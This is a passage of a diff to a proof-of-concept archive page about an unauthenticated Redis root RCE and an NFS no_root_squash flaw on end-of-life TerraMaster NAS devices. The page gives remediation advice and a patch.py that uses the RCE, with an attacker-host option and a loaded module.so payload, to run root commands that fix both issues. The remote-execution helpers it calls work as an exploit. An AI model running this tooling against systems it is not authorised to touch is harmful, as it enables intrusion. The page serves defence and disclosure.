-      PoC Archive — research artifacts for defensive and educational use only.
-    </p>
-    <p class="font-mono">
-      built with <a href="https://gohugo.io" class="text-emerald-600 hover:underline dark:text-emerald-400">hugo</a> · deployed on github pages
-    </p>
-  </div>
-</footer>
-
-</body>
-</html>
+</code></pre><hr><h2 id=remediation>Remediation</h2><table><thead><tr><th>Action</th><th>Detail</th></tr></thead><tbody><tr><td><strong>Patch</strong></td><td>Vendor (TerraMaster) confirmed TOS4 EOL — no fix planned</td></tr><tr><td><strong>Workaround (RCE)</strong></td><td>Block TCP/6379 from untrusted networks; fix init script to use <code>/etc/redis.conf</code>; require Redis authentication; disable <code>CONFIG</code>, <code>SLAVEOF</code>, <code>MODULE</code> commands</td></tr><tr><td><strong>Workaround (LPE)</strong></td><td>Add <code>root_squash</code> to NFS exports; avoid writable exports to untrusted clients</td></tr><tr><td><strong>Config Hardening</strong></td><td>Run Redis as an unprivileged service user; rename or disable dangerous Redis commands</td></tr></tbody></table><hr><h2 id=references>References</h2><ul><li><a href=https://github.com/v12-security/pocs>v12sec TossUp source (v12-security/pocs)</a></li><li><a href=https://redis.io/commands/module-loadex/>Redis MODULE LOAD documentation</a></li><li><a href=https://redis.io/docs/management/replication/>Redis replication protocol</a></li></ul><hr><h2 id=notes>Notes</h2><p>Auto-ingested from v12-pocs/terramaster on 2026-05-18.</p><p>Two separate bugs bundled as &ldquo;TossUp&rdquo;:</p><ol><li>Redis unauthenticated root RCE via replication + module loading (network-exploitable, no credentials).</li><li>NFS <code>no_root_squash</code> LPE (local, independent of the RCE — RCE already runs as root).</li></ol><p>The RCE does not require the LPE; they are independent issues on the same device. Vendor confirmed EOL with no intent to patch. Network isolation (firewall TCP/6379) is the practical first line of defense for affected owners.</p><p>A separate authentication bypass (likely upgradable to RCE) was noted by the researchers but not yet released at time of ingest.</p><p>Discovered autonomously with V12 by Aaron Esau of the V12 security team.</p></div><div class="mt-10 overflow-hidden rounded-lg border border-zinc-700/60 shadow-2xl"><div class="flex items-center gap-3 bg-zinc-800 px-3 py-2"><div class="flex shrink-0 items-center gap-1.5"><span class="h-3 w-3 rounded-full bg-red-500"></span>
+<span class="h-3 w-3 rounded-full bg-yellow-400"></span>
+<span class="h-3 w-3 rounded-full bg-green-500"></span></div><div class="flex flex-1 justify-center"><div class="flex items-center gap-1.5 rounded-t border-x border-t border-zinc-700 bg-zinc-950 px-3 py-1"><span class="h-2.5 w-2.5 shrink-0 rounded-sm" style=background-color:#3b82f6></span>
+<span class="font-mono text-xs text-zinc-200">patch.py</span></div></div><div class="flex shrink-0 items-center gap-2"><span class="rounded border border-zinc-600 bg-zinc-700/40 px-1.5 py-0.5 font-mono text-[10px] uppercase tracking-wide text-zinc-400">python</span>
+<a href=/pocs/network/2026-05-18_tossup-terramaster-redis-rce/patch.py target=_blank rel=noopener class="font-mono text-xs text-zinc-400 hover:text-zinc-200 transition">raw</a>
+<a href=/pocs/network/2026-05-18_tossup-terramaster-redis-rce/patch.py download=patch.py class="rounded bg-emerald-600 px-2.5 py-1 font-mono text-xs font-medium text-white transition hover:bg-emerald-500">↓ Download</a></div></div><div class="poc-viewer overflow-x-auto"><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span><span class=lnt>152
+</span><span class=lnt>153
+</span><span class=lnt>154
+</span><span class=lnt>155
+</span><span class=lnt>156
+</span><span class=lnt>157
+</span><span class=lnt>158
+</span><span class=lnt>159
+</span><span class=lnt>160
+</span><span class=lnt>161
+</span><span class=lnt>162
+</span><span class=lnt>163
+</span><span class=lnt>164
+</span><span class=lnt>165
+</span><span class=lnt>166
+</span><span class=lnt>167
+</span><span class=lnt>168
+</span><span class=lnt>169
+</span><span class=lnt>170
+</span><span class=lnt>171
+</span><span class=lnt>172
+</span><span class=lnt>173
+</span><span class=lnt>174
+</span><span class=lnt>175
+</span><span class=lnt>176
+</span><span class=lnt>177
+</span><span class=lnt>178
+</span><span class=lnt>179
+</span><span class=lnt>180
+</span><span class=lnt>181
+</span><span class=lnt>182
+</span><span class=lnt>183
+</span><span class=lnt>184
+</span><span class=lnt>185
+</span><span class=lnt>186
+</span><span class=lnt>187
+</span><span class=lnt>188
+</span><span class=lnt>189
+</span><span class=lnt>190
+</span><span class=lnt>191
+</span><span class=lnt>192
+</span><span class=lnt>193
+</span><span class=lnt>194
+</span><span class=lnt>195
+</span><span class=lnt>196
+</span><span class=lnt>197
+</span><span class=lnt>198
+</span><span class=lnt>199
+</span><span class=lnt>200
+</span><span class=lnt>201
+</span><span class=lnt>202
+</span><span class=lnt>203
+</span><span class=lnt>204
+</span><span class=lnt>205
+</span><span class=lnt>206
+</span><span class=lnt>207
+</span><span class=lnt>208
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
+</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>patch.py — Exploit TerraMaster TOS Redis RCE to patch both vulnerabilities.
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>Bug 1 (RCE): /etc/init.d/redis is a symlink to /usr/sbin/desh, which runs
+</span></span></span><span class=line><span class=cl><span class=s2>             /etc/init.d/redis.en — an encrypted script that starts
+</span></span></span><span class=line><span class=cl><span class=s2>             &#34;redis-server 0.0.0.0:6379&#34;, ignoring /etc/redis.conf (which
+</span></span></span><span class=line><span class=cl><span class=s2>             already has &#34;bind 127.0.0.1&#34;).
+</span></span></span><span class=line><span class=cl><span class=s2>Fix:         Replace the desh symlink with a proper init script that starts
+</span></span></span><span class=line><span class=cl><span class=s2>             redis-server with /etc/redis.conf.  Ensure daemonize yes is set.
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>Bug 2 (LPE): /etc/exports has no_root_squash on NFS exports.
+</span></span></span><span class=line><span class=cl><span class=s2>Fix:         Replace no_root_squash with root_squash and re-export.
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>Usage:
+</span></span></span><span class=line><span class=cl><span class=s2>    python3 patch.py &lt;NAS_IP&gt;
+</span></span></span><span class=line><span class=cl><span class=s2>    python3 patch.py &lt;NAS_IP&gt; --lhost &lt;ATTACKER_IP&gt;
+</span></span></span><span class=line><span class=cl><span class=s2>    python3 patch.py &lt;NAS_IP&gt; --no-restart
+</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>argparse</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>SCRIPT_DIR</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>dirname</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>abspath</span><span class=p>(</span><span class=vm>__file__</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>sys</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>insert</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>SCRIPT_DIR</span><span class=p>,</span> <span class=s2>&#34;rce&#34;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>poc</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>poc</span> <span class=kn>import</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl>    <span class=n>Progress</span><span class=p>,</span> <span class=n>deliver_module</span><span class=p>,</span> <span class=n>redis_load_module</span><span class=p>,</span> <span class=n>redis_exec</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=n>redis_cmd</span><span class=p>,</span> <span class=n>info</span><span class=p>,</span> <span class=n>good</span><span class=p>,</span> <span class=n>warn</span><span class=p>,</span> <span class=n>bail</span><span class=p>,</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>REDIS_INIT</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;</span><span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span><span class=s2>#!/bin/sh
+</span></span></span><span class=line><span class=cl><span class=s2># Patched by patch.py — uses /etc/redis.conf instead of hardcoded 0.0.0.0:6379
+</span></span></span><span class=line><span class=cl><span class=s2>DAEMON=/usr/bin/redis-server
+</span></span></span><span class=line><span class=cl><span class=s2>CONF=/etc/redis.conf
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>case &#34;$1&#34; in
+</span></span></span><span class=line><span class=cl><span class=s2>  start)
+</span></span></span><span class=line><span class=cl><span class=s2>    &#34;$DAEMON&#34; &#34;$CONF&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>    ;;
+</span></span></span><span class=line><span class=cl><span class=s2>  stop)
+</span></span></span><span class=line><span class=cl><span class=s2>    redis-cli shutdown nosave 2&gt;/dev/null || killall redis-server 2&gt;/dev/null
+</span></span></span><span class=line><span class=cl><span class=s2>    ;;
+</span></span></span><span class=line><span class=cl><span class=s2>  restart|reload)
+</span></span></span><span class=line><span class=cl><span class=s2>    &#34;$0&#34; stop
+</span></span></span><span class=line><span class=cl><span class=s2>    sleep 1
+</span></span></span><span class=line><span class=cl><span class=s2>    &#34;$0&#34; start
+</span></span></span><span class=line><span class=cl><span class=s2>    ;;
+</span></span></span><span class=line><span class=cl><span class=s2>  *)
+</span></span></span><span class=line><span class=cl><span class=s2>    echo &#34;Usage: $0 {start|stop|restart}&#34; &gt;&amp;2
+</span></span></span><span class=line><span class=cl><span class=s2>    exit 1
+</span></span></span><span class=line><span class=cl><span class=s2>    ;;
+</span></span></span><span class=line><span class=cl><span class=s2>esac
+</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rexec</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=n>cmd</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Execute a shell command on the target via system.exec.&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>redis_exec</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=n>cmd</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>write_remote</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=n>path</span><span class=p>,</span> <span class=n>content</span><span class=p>,</span> <span class=n>mode</span><span class=o>=</span><span class=kc>None</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Write a text file on the target via base64-encoded echo.&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>b64</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>content</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>rexec</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;echo &#39;</span><span class=si>{</span><span class=n>b64</span><span class=si>}</span><span class=s2>&#39; | base64 -d &gt; </span><span class=si>{</span><span class=n>path</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>mode</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>rexec</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;chmod </span><span class=si>{</span><span class=n>mode</span><span class=si>}</span><span class=s2> </span><span class=si>{</span><span class=n>path</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>patch_redis</span><span class=p>(</span><span class=n>sock</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Replace the desh-encrypted Redis init script with one that honours
+</span></span></span><span class=line><span class=cl><span class=s2>    /etc/redis.conf, and ensure the config has daemonize yes.&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># --- verify the config already binds to localhost ---</span>
+</span></span><span class=line><span class=cl>    <span class=n>bind_line</span> <span class=o>=</span> <span class=n>rexec</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=s2>&#34;grep &#39;^bind &#39; /etc/redis.conf&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;127.0.0.1&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>bind_line</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>bail</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;/etc/redis.conf bind is not 127.0.0.1: </span><span class=si>{</span><span class=n>bind_line</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>good</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;redis.conf bind verified: </span><span class=si>{</span><span class=n>bind_line</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># --- ensure daemonize yes (stock config ships &#39;daemonize no&#39;) ---</span>
+</span></span><span class=line><span class=cl>    <span class=n>daemonize</span> <span class=o>=</span> <span class=n>rexec</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=s2>&#34;grep &#39;^daemonize &#39; /etc/redis.conf&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;yes&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>daemonize</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>info</span><span class=p>(</span><span class=s2>&#34;Setting daemonize yes in /etc/redis.conf&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>rexec</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=s2>&#34;sed -i &#39;s/^daemonize .*/daemonize yes/&#39; /etc/redis.conf&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>verify</span> <span class=o>=</span> <span class=n>rexec</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=s2>&#34;grep &#39;^daemonize &#39; /etc/redis.conf&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;yes&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>verify</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>rexec</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=s2>&#34;echo &#39;daemonize yes&#39; &gt;&gt; /etc/redis.conf&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>good</span><span class=p>(</span><span class=s2>&#34;daemonize yes set&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>good</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;redis.conf daemonize verified: </span><span class=si>{</span><span class=n>daemonize</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># --- safety: confirm init script is the vulnerable desh symlink ---</span>
+</span></span><span class=line><span class=cl>    <span class=n>target</span> <span class=o>=</span> <span class=n>rexec</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=s2>&#34;readlink /etc/init.d/redis 2&gt;/dev/null || echo NOT_A_SYMLINK&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;/usr/sbin/desh&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>target</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>warn</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;/etc/init.d/redis is not the expected desh symlink (</span><span class=si>{</span><span class=n>target</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=si>}</span><span class=s2>)&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>warn</span><span class=p>(</span><span class=s2>&#34;Skipping init script replacement — may already be patched&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># --- replace the symlink with a real init script ---</span>
+</span></span><span class=line><span class=cl>    <span class=n>rexec</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=s2>&#34;cp -a /etc/init.d/redis /etc/init.d/redis.bak.pre-patch 2&gt;/dev/null; true&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>rexec</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=s2>&#34;rm -f /etc/init.d/redis&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>write_remote</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=s2>&#34;/etc/init.d/redis&#34;</span><span class=p>,</span> <span class=n>REDIS_INIT</span><span class=p>,</span> <span class=n>mode</span><span class=o>=</span><span class=s2>&#34;755&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>head</span> <span class=o>=</span> <span class=n>rexec</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=s2>&#34;head -2 /etc/init.d/redis&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;#!/bin/sh&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>head</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>bail</span><span class=p>(</span><span class=s2>&#34;Failed to write /etc/init.d/redis&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>good</span><span class=p>(</span><span class=s2>&#34;Patched /etc/init.d/redis — will use /etc/redis.conf on restart&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>patch_nfs</span><span class=p>(</span><span class=n>sock</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Replace no_root_squash with root_squash in /etc/exports and re-export.&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>exports</span> <span class=o>=</span> <span class=n>rexec</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=s2>&#34;cat /etc/exports 2&gt;/dev/null&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>exports</span><span class=o>.</span><span class=n>strip</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>        <span class=n>warn</span><span class=p>(</span><span class=s2>&#34;/etc/exports is empty or missing — skipping NFS patch&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;no_root_squash&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>exports</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>warn</span><span class=p>(</span><span class=s2>&#34;no_root_squash not found in /etc/exports — already fixed or not present&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Current /etc/exports:</span><span class=se>\n</span><span class=si>{</span><span class=n>exports</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>rexec</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=s2>&#34;cp /etc/exports /etc/exports.bak.pre-patch&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>rexec</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=s2>&#34;sed -i &#39;s/no_root_squash/root_squash/g&#39; /etc/exports&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>patched</span> <span class=o>=</span> <span class=n>rexec</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=s2>&#34;cat /etc/exports&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;no_root_squash&#34;</span> <span class=ow>in</span> <span class=n>patched</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>bail</span><span class=p>(</span><span class=s2>&#34;sed replacement failed on /etc/exports&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>good</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Patched /etc/exports:</span><span class=se>\n</span><span class=si>{</span><span class=n>patched</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>rexec</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=s2>&#34;exportfs -ra 2&gt;/dev/null; true&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>good</span><span class=p>(</span><span class=s2>&#34;NFS re-exported with root_squash&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>parser</span> <span class=o>=</span> <span class=n>argparse</span><span class=o>.</span><span class=n>ArgumentParser</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>        <span class=n>description</span><span class=o>=</span><span class=s2>&#34;Exploit TerraMaster TOS Redis RCE to patch both bugs&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;host&#34;</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s2>&#34;NAS IP address&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--lhost&#34;</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                        <span class=n>help</span><span class=o>=</span><span class=s2>&#34;Attacker IP reachable from target (default: auto)&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--no-restart&#34;</span><span class=p>,</span> <span class=n>action</span><span class=o>=</span><span class=s2>&#34;store_true&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                        <span class=n>help</span><span class=o>=</span><span class=s2>&#34;Skip Redis restart after patching&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>args</span> <span class=o>=</span> <span class=n>parser</span><span class=o>.</span><span class=n>parse_args</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>poc</span><span class=o>.</span><span class=n>_progress</span> <span class=o>=</span> <span class=n>Progress</span><span class=p>(</span><span class=n>total</span><span class=o>=</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># --- load the .so payload ---</span>
+</span></span><span class=line><span class=cl>    <span class=n>module_so</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>SCRIPT_DIR</span><span class=p>,</span> <span class=s2>&#34;rce&#34;</span><span class=p>,</span> <span class=s2>&#34;module.so&#34;</span><span class=p>)</span>
